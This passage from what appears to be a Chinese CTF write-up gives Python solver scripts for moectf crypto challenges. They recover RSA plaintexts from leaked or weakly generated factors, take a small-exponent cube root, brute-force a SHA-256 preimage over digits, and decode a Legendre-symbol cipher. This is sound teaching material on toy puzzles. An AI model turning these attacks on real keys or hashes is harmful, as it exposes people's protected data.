d, n)<br><br><span class="hljs-comment"># 将明文 m 转换为字节</span><br>flag = long_to_bytes(m)<br><br><span class="hljs-comment"># 输出解密的结果</span><br><span class="hljs-built_in">print</span>(flag.decode())<br><br></code></pre></td></tr></table></figure>
<h2 id="signin-2"><a class="markdownIt-Anchor" href="#signin-2"></a> Signin</h2>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> inverse, long_to_bytes, GCD<br><span class="hljs-keyword">from</span> sympy <span class="hljs-keyword">import</span> symbols, solve<br><br><span class="hljs-comment"># 先定义已知的变量</span><br>c = <span class="hljs-number">5654386228732582062836480859915557858019553457231956237167652323191768422394980061906028416785155458721240012614551996577092521454960121688179565370052222983096211611352630963027300416387011219744891121506834201808533675072141450111382372702075488292867077512403293072053681315714857246273046785264966933854754543533442866929316042885151966997466549713023923528666038905359773392516627983694351534177829247262148749867874156066768643169675380054673701641774814655290118723774060082161615682005335103074445205806731112430609256580951996554318845128022415956933291151825345962528562570998777860222407032989708801549746</span><br>pq = <span class="hljs-number">18047017539289114275195019384090026530425758236625347121394903879980914618669633902668100353788910470141976640337675700570573127020693081175961988571621759711122062452192526924744760561788625702044632350319245961013430665853071569777307047934247268954386678746085438134169871118814865536503043639618655569687154230787854196153067547938936776488741864214499155892870610823979739278296501074632962069426593691194105670021035337609896886690049677222778251559566664735419100459953672218523709852732976706321086266274840999100037702428847290063111455101343033924136386513077951516363739936487970952511422443500922412450462</span><br>qp = <span class="hljs-number">18047017539289114275195019384090026530425758236625347121394903879980914618669633902668100353788910470141976640337675700570573127020693081175961988571621759711122062452192526924744760561788625702044632350319245961013430665853071569777307047934247268954386678746085438134169871118814865536503043639618655569687077087914198877794354459669808240133383828356379423767736753506794441545506312066344576298453957064590180141648690226266236642320508613544047037110363523129966437840660693885863331837516125853621802358973786440314619135781324447765480391038912783714312479080029167695447650048419230865326299964671353746764860</span><br>n = <span class="hljs-number">18047017539289114275195019384090026530425758236625347121394903879980914618669633902668100353788910470141976640337675700570573127020693081175961988571621759711122062452192526924744760561788625702044632350319245961013430665853071569777307047934247268954386678746085438134169871118814865536503043639618655569687534959910892789661065614807265825078942931717855566686073463382398417205648946713373617006449901977718981043020664616841303517708207413215548110294271101267236070252015782044263961319221848136717220979435486850254298686692230935985442120369913666939804135884857831857184001072678312992442792825575636200505903</span><br>p_q = <span class="hljs-number">279533706577501791569740668595544511920056954944184570513187478007551195831693428589898548339751066551225424790534556602157835468618845221423643972870671556362200734472399328046960316064864571163851111207448753697980178391430044714097464866523838747053135392202848167518870720149808055682621080992998747265496</span><br>e = <span class="hljs-number">65537</span><br><br><span class="hljs-comment"># 恢复 p 和 q</span><br>x = symbols(<span class="hljs-string">&#x27;x&#x27;</span>)<br>equation = x**<span class="hljs-number">2</span> - p_q*x + n<br>solutions = solve(equation, x)<br>p = <span class="hljs-built_in">int</span>(solutions[<span class="hljs-number">0</span>])<br>q = <span class="hljs-built_in">int</span>(solutions[<span class="hljs-number">1</span>])<br><br><span class="hljs-comment"># 计算 φ(n)</span><br>phi_n = (p - <span class="hljs-number">1</span>) * (q - <span class="hljs-number">1</span>)<br><br><span class="hljs-comment"># 计算私钥 d</span><br>d = inverse(e, phi_n)<br><br><span class="hljs-comment"># 解密消息</span><br>m = <span class="hljs-built_in">pow</span>(c, d, n)<br>flag = long_to_bytes(m)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Recovered flag: <span class="hljs-subst">&#123;flag.decode()&#125;</span>&quot;</span>)<br><br></code></pre></td></tr></table></figure>
<h2 id="big-and-small"><a class="markdownIt-Anchor" href="#big-and-small"></a> Big and small</h2>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes<br><span class="hljs-keyword">import</span> gmpy2<br><br><span class="hljs-comment"># 给定的c, e, n</span><br>c = <span class="hljs-number">150409620528288093947185249913242033500530715593845912018225648212915478065982806112747164334970339684262757</span><br>e = <span class="hljs-number">3</span><br>n = <span class="hljs-number">20279309983698966932589436610174513524888616098014944133902125993694471293062261713076591251054086174169670848598415548609375570643330808663804049384020949389856831520202461767497906977295453545771698220639545101966866003886108320987081153619862170206953817850993602202650467676163476075276351519648193219850062278314841385459627485588891326899019745457679891867632849975694274064320723175687748633644074614068978098629566677125696150343248924059801632081514235975357906763251498042129457546586971828204136347260818828746304688911632041538714834683709493303900837361850396599138626509382069186433843547745480160634787</span><br><br><span class="hljs-comment"># 使用 gmpy2 提供的立方根计算函数</span><br>m, exact = gmpy2.iroot(c, e)<br><br><span class="hljs-comment"># 如果立方根是精确的，我们可以直接获取明文</span><br><span class="hljs-keyword">if</span> exact:<br>    flag = long_to_bytes(m)<br>    <span class="hljs-built_in">print</span>(flag)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;密文可能无法直接解密，或者立方根不精确。&quot;</span>)<br><br></code></pre></td></tr></table></figure>
<h2 id="ez_hash"><a class="markdownIt-Anchor" href="#ez_hash"></a> ez_hash</h2>
<p>给的提示其实因为是qq号所以都是数字，直接爆破就好</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> sha256<br><span class="hljs-comment"># 给定的哈希值</span><br>target_hash = <span class="hljs-string">&#x27;3a5137149f705e4da1bf6742e62c018e3f7a1784ceebcb0030656a2b42f50b6a&#x27;</span><br><span class="hljs-comment"># 已知的秘密开头</span><br>prefix = <span class="hljs-string">b&#x27;2100&#x27;</span><br><span class="hljs-comment"># 暴力破解可能的秘密</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1000000</span>):  <span class="hljs-comment"># 从 000000 到 999999</span><br>    <span class="hljs-comment"># 格式化为 6 位数字，不足的前面补零</span><br>    suffix = <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;i:06&#125;</span>&#x27;</span>.encode()<br>    secrets = prefix + suffix<br>    <span class="hljs-comment"># 计算 SHA-256 哈希值</span><br>    hash_value = sha256(secrets).hexdigest()<br>    <span class="hljs-comment"># 检查哈希值是否匹配</span><br>    <span class="hljs-keyword">if</span> hash_value == target_hash:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Found secrets: <span class="hljs-subst">&#123;secrets.decode()&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">break</span><br><br></code></pre></td></tr></table></figure>
<h2 id="baby_equation"><a class="markdownIt-Anchor" href="#baby_equation"></a> baby_equation</h2>
<p>首先对这个进行化简</p>
<p class="katex-block"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mo stretchy="false">(</mo><mo stretchy="false">(</mo><msup><mi>a</mi><mn>2</mn></msup><mo>+</mo><mn>1</mn><mo stretchy="false">)</mo><mo>∗</mo><mo stretchy="false">(</mo><msup><mi>b</mi><mn>2</mn></msup><mo>+</mo><mn>1</mn><mo stretchy="false">)</mo><mo>−</mo><mn>2</mn><mo>∗</mo><mo stretchy="false">(</mo><mi>a</mi><mo>−</mo><mi>b</mi><mo stretchy="false">)</mo><mo>∗</mo><mo stretchy="false">(</mo><mi>a</mi><mo>∗</mo><mi>b</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo><mo stretchy="false">)</mo><mo>=</mo><mo>=</mo><mn>4</mn><mo>∗</mo><mo stretchy="false">(</mo><mi>k</mi><mo>+</mo><mi>a</mi><mo>∗</mo><mi>b</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">((a^2 + 1)*(b^2 + 1) - 2*(a - b)*(a*b - 1)) == 4*(k + a*b)
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.1141079999999999em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.1141079999999999em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">2</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">b</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.77777em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">b</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span></span><span class="base"><span class="strut" style="height:0.36687em;vertical-align:0em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">4</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.46528em;vertical-align:0em;"></span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">b</span><span class="mclose">)</span></span></span></span></span></p>
<p class="katex-block"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mo stretchy="false">(</mo><mi>a</mi><mo>+</mo><mn>1</mn><msup><mo stretchy="false">)</mo><mn>2</mn></msup><mo stretchy="false">(</mo><mi>b</mi><mo>−</mo><mn>1</mn><msup><mo stretchy="false">)</mo><mn>2</mn></msup><mo>=</mo><mn>4</mn><mi>k</mi></mrow><annotation encoding="application/x-tex">(a+1)^2(b-1)^2=4k
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.1141079999999999em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">b</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.1141079999999999em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord">4</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span></span></p>
<p>然后还有求a,b</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">find</span>(<span class="hljs-params">tot, index, ls</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    递归查找函数，用于寻找合适的因子组合，使得通过这些因子构造出的数字能够还原出 flag。</span><br><span class="hljs-string">    :param tot: 当前的乘积值（初始值为1）。</span><br><span class="hljs-string">    :param index: 当前处理的因子索引。</span><br><span class="hljs-string">    :param ls: 因子列表，包含所有可能的因子。</span><br><span class="hljs-string">    :return: 满足条件的乘积值，如果未找到则返回0。</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-comment"># 基准情况：如果已经检查了所有因子</span><br>    <span class="hljs-keyword">if</span> index == <span class="hljs-built_in">len</span>(ls):<br>        <span class="hljs-comment"># 检查当前的 tot 是否可能包含 flag 的特征字符串（例如 &#x27;moectf&#123;&#x27;）</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;moectf&#123;&#x27;</span> <span class="hljs-keyword">in</span> long_to_bytes(tot):<br>            <span class="hljs-keyword">return</span> tot  <span class="hljs-comment"># 返回找到的值</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>  <span class="hljs-comment"># 没找到返回 0</span><br><br>    <span class="hljs-comment"># 递归查找，尝试包含当前因子的情况</span><br>    a = find(tot * ls[index], index + <span class="hljs-number">1</span>, ls)<br>    <span class="hljs-comment"># 递归查找，尝试不包含当前因子的情况</span><br>    b = find(tot, index + <span class="hljs-number">1</span>, ls)<br><br>    <span class="hljs-comment"># 返回找到的非零结果</span><br>    <span class="hljs-keyword">return</span> a <span class="hljs-keyword">if</span> a != <span class="hljs-number">0</span> <span class="hljs-keyword">else</span> b<br><br><br><span class="hljs-comment"># 给定的常量 k 值</span><br>k = <span class="hljs-number">0x2227e398fc6ffcf5159863a345df85ba50d6845f8c06747769fee78f598e7cb1bcf875fb9e5a69ddd39da950f21cb49581c3487c29b7c61da0f584c32ea21ce1edda7f09a6e4c3ae3b4c8c12002bb2dfd0951037d3773a216e209900e51c7d78a0066aa9a387b068acbd4fb3168e915f306ba40</span><br><br><span class="hljs-comment"># 计算 a1b1 = sqrt(4 * k)</span><br>a1b1 = gmpy2.iroot(<span class="hljs-number">4</span> * k, <span class="hljs-number">2</span>)[<span class="hljs-number">0</span>]<br><br><span class="hljs-comment"># 因子列表，包含可能分解出的因子组合</span><br>fac = [<br>    <span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">3</span>, <span class="hljs-number">31</span>, <span class="hljs-number">61</span>, <span class="hljs-number">223</span>, <span class="hljs-number">4013</span>, <span class="hljs-number">281317</span>, <span class="hljs-number">4151351</span>, <span class="hljs-number">339386329</span>, <span class="hljs-number">370523737</span>,<br>    <span class="hljs-number">5404604441993</span>, <span class="hljs-number">26798471753993</span>, <span class="hljs-number">25866088332911027256931479223</span>,<br>    <span class="hljs-number">64889106213996537255229963986303510188999911</span><br>]<br><br><span class="hljs-comment"># 使用递归查找因子组合，得到 a1</span><br>a1 = find(<span class="hljs-number">1</span>, <span class="hljs-number">0</span>, fac)<br><br><span class="hljs-comment"># 计算 b1 = a1b1 // a1</span><br>b1 = a1b1 // a1<br><br><span class="hljs-comment"># 使用 long_to_bytes 将 a1 和 b1 转换为字节并输出 flag</span><br><span class="hljs-built_in">print</span>(long_to_bytes(a1 - <span class="hljs-number">1</span>) + long_to_bytes(b1 + <span class="hljs-number">1</span>))<br></code></pre></td></tr></table></figure>
<h2 id="new_system"><a class="markdownIt-Anchor" href="#new_system"></a> new_system</h2>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes<br><br><span class="hljs-comment"># 给定的值</span><br>a1, c1 = [<span class="hljs-number">48152794364522745851371693618734308982941622286593286738834529420565211572487</span>, <span class="hljs-number">21052760152946883017126800753094180159601684210961525956716021776156447417961</span>]<br>a2, c2 = [<span class="hljs-number">48649737427609115586886970515713274413023152700099032993736004585718157300141</span>, <span class="hljs-number">6060718815088072976566240336428486321776540407635735983986746493811330309844</span>]<br>a, c = [<span class="hljs-number">30099883325957937700435284907440664781247503171217717818782838808179889651361</span>, <span class="hljs-number">85333708281128255260940125642017184300901184334842582132090488518099650581761</span>]<br>q = <span class="hljs-number">105482865285555225519947662900872028851795846950902311343782163147659668129411</span><br><br>b = (c - c1 - c2) % q<br>d = (a - a1 - a2) % q<br><br><span class="hljs-keyword">assert</span> b &gt; <span class="hljs-number">0</span><br><span class="hljs-keyword">assert</span> d &gt; <span class="hljs-number">0</span><br><span class="hljs-keyword">assert</span> gmpy2.gcd(d, q) == <span class="hljs-number">1</span><br>inv_d = gmpy2.invert(d, q)<br>x = (b * inv_d) % q<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;The value of x is: <span class="hljs-subst">&#123;x&#125;</span>&quot;</span>)<br><br>gift = (c - a * x) % q<br><span class="hljs-built_in">print</span>(long_to_bytes(gift))<br></code></pre></td></tr></table></figure>
<h2 id="rsa_revenge"><a class="markdownIt-Anchor" href="#rsa_revenge"></a> RSA_revenge</h2>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes<br><span class="hljs-keyword">import</span> gmpy2<br><br><span class="hljs-comment"># 给定的数值</span><br>n = <span class="hljs-number">141326884939079067429645084585831428717383389026212274986490638181168709713585245213459139281395768330637635670530286514361666351728405851224861268366256203851725349214834643460959210675733248662738509224865058748116797242931605149244469367508052164539306170883496415576116236739853057847265650027628600443901</span><br>c = <span class="hljs-number">47886145637416465474967586561554275347396273686722042112754589742652411190694422563845157055397690806283389102421131949492150512820301748529122456307491407924640312270962219946993529007414812671985960186335307490596107298906467618684990500775058344576523751336171093010950665199612378376864378029545530793597</span><br>e = <span class="hljs-number">65537</span><br><br><span class="hljs-comment"># 初始的 Brute Force 用于寻找 p 和 q</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">brute_force</span>(<span class="hljs-params">a, b, k</span>):<br>    <span class="hljs-keyword">if</span> k == <span class="hljs-number">256</span>:<br>        <span class="hljs-keyword">if</span> a * b == n:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;找到因子: a=<span class="hljs-subst">&#123;a&#125;</span>, b=<span class="hljs-subst">&#123;b&#125;</span>&#x27;</span>)<br>            <span class="hljs-keyword">return</span> a, b<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span><br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>):<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>):<br>            a1 = a + i * (<span class="hljs-number">2</span> ** (<span class="hljs-number">511</span> - k)) + j * (<span class="hljs-number">2</span> ** k)<br>            b1 = b + j * (<span class="hljs-number">2</span> ** (<span class="hljs-number">511</span> - k)) + i * (<span class="hljs-number">2</span> ** k)<br><br>            <span class="hljs-keyword">if</span> a1 * b1 &gt; n:<br>                <span class="hljs-keyword">continue</span><br><br>            <span class="hljs-keyword">if</span> (a1 + <span class="hljs-number">2</span> ** (<span class="hljs-number">511</span> - k)) * ((b1 + <span class="hljs-number">2</span> ** (<span class="hljs-number">511</span> - k))) &lt; n:<br>                <span class="hljs-keyword">continue</span><br><br>            <span class="hljs-keyword">if</span> (a1 * b1) % (<span class="hljs-number">2</span> ** (k + <span class="hljs-number">1</span>)) != n % (<span class="hljs-number">2</span> ** (k + <span class="hljs-number">1</span>)):<br>                <span class="hljs-keyword">continue</span><br><br>            result = brute_force(a1, b1, k + <span class="hljs-number">1</span>)<br>            <span class="hljs-keyword">if</span> result:<br>                <span class="hljs-keyword">return</span> result<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span><br><br><span class="hljs-comment"># 调用 Brute Force 函数来找到 p 和 q</span><br>p, q = brute_force(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>)<br><br><span class="hljs-comment"># RSA 解密函数</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt_rsa</span>(<span class="hljs-params">p, q, c, e</span>):<br>    <span class="hljs-comment"># 计算模数 n 和 Euler&#x27;s totient (phi)</span><br>    n = p * q<br>    phi = (p - <span class="hljs-number">1</span>) * (q - <span class="hljs-number">1</span>)<br><br>    <span class="hljs-comment"># 计算私钥 d</span><br>    d = gmpy2.invert(e, phi)<br><br>    <span class="hljs-comment"># 使用私钥解密密文</span><br>    m = <span class="hljs-built_in">pow</span>(c, d, n)<br>    <span class="hljs-keyword">return</span> long_to_bytes(m)<br><br><span class="hljs-comment"># 解密并打印结果</span><br>plaintext = decrypt_rsa(p, q, c, e)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;解密后的明文: <span class="hljs-subst">&#123;plaintext.decode()&#125;</span>&#x27;</span>)<br></code></pre></td></tr></table></figure>
<h2 id="ezlegendre"><a class="markdownIt-Anchor" href="#ezlegendre"></a> ezlegendre</h2>
<p>对于密文中的每个数字 n，我们计算 (n-a | p) 的勒让德符号。</p>
<p>如果勒让德符号为 1，则对应的原始比特为 1；否则为 0。</p>
<p>我们将所有解密出的比特拼接成一个二进制字符串。</p>
<p>最后，我们将二进制字符串每8位转换为一个ASCII字符，得到最终的明文</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> sympy <span class="hljs-keyword">import</span> legendre_symbol<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt_flag</span>(<span class="hljs-params">ciphertext, p, a</span>):<br>    plaintext = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> ciphertext:<br>        <span class="hljs-comment"># 计算勒让德符号 (n|p) 和 (a|p)</span><br>        